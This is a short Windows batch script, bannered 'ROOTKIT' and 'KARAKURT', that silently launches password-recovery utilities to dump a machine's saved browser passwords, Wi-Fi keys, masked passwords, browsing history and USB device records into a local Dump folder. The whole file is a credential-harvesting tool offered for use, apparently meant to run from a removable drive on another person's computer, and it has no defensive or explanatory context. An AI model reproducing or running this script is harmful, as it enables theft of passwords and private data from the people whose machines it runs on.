@echo off
color 3
TITLE ROOTKIT
echo ==================================================================================================================
echo =================================================KARAKURT==============================================
echo ==================================================================================================================


@echo off
start WebBrowserPassView.exe /stext Dump/WebBrowserPassView.txt
start WirelessKeyView.exe /stext Dump/WirelessKeyView.txt
start BrowsingHistoryView.exe /stext Dump/BrowsingHistoryView.txt
start USBDeview.exe /stext Dump/USBDeview.txt
start BulletsPassView.exe /stext Dump/BulletsPassView.txt
start ChromeHistoryView.exe /stext Dump/ChromeHistoryView.txt